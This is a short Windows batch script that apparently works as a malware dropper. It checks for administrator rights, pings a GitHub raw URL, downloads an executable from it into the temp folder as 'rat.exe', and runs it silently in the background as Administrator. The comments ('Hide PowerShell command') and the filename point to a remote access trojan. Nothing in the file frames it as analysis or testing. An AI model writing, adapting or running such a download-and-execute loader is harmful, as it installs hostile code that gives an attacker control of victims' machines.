@echo off
setlocal enabledelayedexpansion

:: Check if the script is running as admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Admin privileges required
    exit /b
)

:: Hide PowerShell command
powershell -Command "[System.Net.WebRequest]::Create('https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe').GetResponse() | Out-Null"

:: Download the file
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe"

:: Execute the downloaded file as administrator
start /B "" runas /user:Administrator "%TEMP%\rat.exe"

endlocal
